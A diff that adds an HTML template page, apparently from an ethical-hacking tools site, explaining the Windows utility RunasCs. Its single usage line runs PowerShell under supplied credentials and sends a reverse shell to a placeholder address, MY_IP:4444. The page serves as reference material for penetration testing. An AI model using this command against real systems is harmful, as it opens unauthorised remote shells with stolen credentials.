@@ -1,0 +1,18 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/tools/util.css' %}">
+</head>
+<body>
+    <h1>What is <code>RunasCS.exe</code>?</h1>
+    <p class="common">RunasCs is an open-source utility for Windows that allows users to run processes with different permissions using explicit credentials, overcoming limitations found in the built-in Windows runas.exe command.</p>
+
+    <h1>Usage</h1>
+    <div class="code-box"><pre><code>.\RunasCs.exe USERNAME PASSWORD -r MY_IP:4444 powershell</code></pre></div>
+    <ul><li><code>-r</code> : remote flag</li></ul>
+</body>
+</html>
